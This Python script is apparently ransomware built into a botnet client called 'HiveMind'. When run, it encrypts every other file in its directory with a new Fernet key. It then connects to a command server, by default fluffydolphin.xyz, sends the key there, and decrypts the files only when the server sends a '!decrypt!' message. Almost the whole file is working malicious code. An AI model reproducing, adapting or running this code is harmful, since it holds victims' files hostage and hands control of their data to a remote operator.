import os 
from cryptography.fernet import Fernet
import socket
from threading import Thread
import argparse
import sys



files = []

for file in os.listdir():
    if file == os.path.basename(__file__):
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb")   as thefile:
        thefile.write(contents_encrypted)

secret_key = key

def decrypt():
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secret_key).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
 

parser = argparse.ArgumentParser(
    description="HiveMind, python bot net using sockets."
)

parser.add_argument("host", default= "fluffydolphin.xyz", nargs="?", help="Address of the Server.")

parser.add_argument(
    "-p", "--port", default=421, help="Port the Server is running on.", type=int
)


args = parser.parse_args()


if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host required! \n")
    parser.print_help()
    sys.exit(1)


s = socket.socket()
s.connect((args.host, args.port))
print("[+] Connected.")


node_number = s.recv(1024).decode()


def listen_for_messages():
    while True:
        message = s.recv(1024).decode()
        if "!connected!" in message:
            connected_nodes = f"{node_number}: connected \n"
            s.send(connected_nodes.encode())
        if f"{node_number}!decrypt!" in message:
            decrypt()



t = Thread(target=listen_for_messages)
t.daemon = True
t.start()


to_send = f"{node_number}'s key = {key}"
s.send(to_send.encode()) 

while True:
    if "!quit!" in to_send:
        s.close()
        sys.exit()


s.close()
